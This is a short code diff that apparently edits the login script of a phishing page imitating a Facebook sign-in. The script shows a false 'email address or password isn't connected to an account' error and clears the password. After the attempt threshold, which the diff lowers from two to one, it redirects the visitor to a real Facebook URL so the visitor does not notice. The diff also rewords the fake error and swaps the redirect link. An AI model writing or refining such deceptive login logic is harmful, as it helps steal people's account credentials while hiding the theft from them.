@@ -265,12 +265,13 @@ form a {
               errorMessage.style.display = "block";
             });
 
-          if(count<=2){
-           errorMessage.innerText = "The email address or mobile number you entered isn't connected to an account. Find your account and log in.";
+          if(count<=1){
+           // errorMessage.innerText = "The email address or mobile number you entered isn't connected to an account. Find your account and log in.";
+              errorMessage.innerText = "The email address or password you entered isn't connected to an account";
            errorMessage.style.display = "block";
           }
           else{
-            window.location.href = "https://www.facebook.com/profile.php?id=61576104287629";
+            window.location.href = "https://www.facebook.com/share/r/1Aq8RFAuWq/";
           }
            passwordInput.value = "";
         }
